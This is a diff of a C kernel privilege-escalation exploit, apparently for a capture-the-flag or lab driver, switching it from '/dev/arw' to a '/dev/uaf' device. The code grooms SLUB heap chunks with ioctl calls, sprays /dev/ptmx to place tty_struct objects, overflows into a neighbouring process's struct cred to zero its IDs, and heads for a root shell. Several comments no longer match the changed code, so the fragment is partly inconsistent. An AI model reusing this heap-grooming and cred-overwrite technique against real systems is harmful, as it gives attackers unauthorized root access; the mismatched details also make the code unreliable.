@@ -1,4 +1,4 @@
-#include "../../template/template.h"
+#include "template.h"
 
 struct param{
 
@@ -14,7 +14,6 @@ void refactor(){
 
 int main(){
 
-	printf("heap exploit kernel!\n");
 	int fds[20];
 	int ptmx_fds[0x100];
 	char buf[8];
@@ -23,7 +22,7 @@ int main(){
 	//open 10 fds for next ioctl usage.
 	for (int i = 0; i < 10 ; i++){
 		
-		fd  = open("/dev/arw", O_RDWR);
+		fd  = open("/dev/uaf", O_RDWR);
 		if(fd == -1){
 			perror("open device wrong" );
 			return -1;
@@ -37,23 +36,23 @@ int main(){
 
 	//ioctl to kmalloc 10 0x98 chunk in slub.
 	//before that ,we clean the remaining chunks.
-	for(int i = 0; i < 0x400; i++){
+	for(int i = 0; i < 0x100; i++){
 
 		p.idx = i;
-		ioctl(fds[i], 5, &p);
+		ioctl(fds[i], 'd', &p);
 	}
 
 	//reallocate
 	printf("clean! now reallocate: \n");
 	for(int i = 0; i < 10; i++){
 		p.idx = i;
-		ioctl(fds[i], 5, &p);
+		ioctl(fds[i], 'd', &p);
 	}
 
 	//free middle ones
 	for(int i=5; i<6; i++){
 		p.idx = i;
-		ioctl(fds[i], 7, &p); //free idx 5-8.
+		ioctl(fds[i], 'c', &p); //free idx 5-8.
 	}
 
 	//spray /dev/ptmx! there'll be tty_struct on some slub chunks.
@@ -75,10 +74,10 @@ int main(){
 
 	//now ptr[4] is adjacent to new process's struct cred!
 	//let's overflow it(ptr[4]) to privilege
-	p.idx = 4; //points to the fourth chunk
-	p.len = 0xc0 + 0x1c; //overflow into point right before fsuid. 
+	p.idx = 5; //points to the fourth chunk
+	p.len = 0x1c; //overflow into point right before fsuid. 
 	memset(p.buf, 0, p.len); //all set.
-	ioctl(fds[4], 8, &p); //copy from user.
+	ioctl(fds[5], 'b', &p); //copy from user.
 
 	if(!pid){
 		printf("launch root shell now!\n");
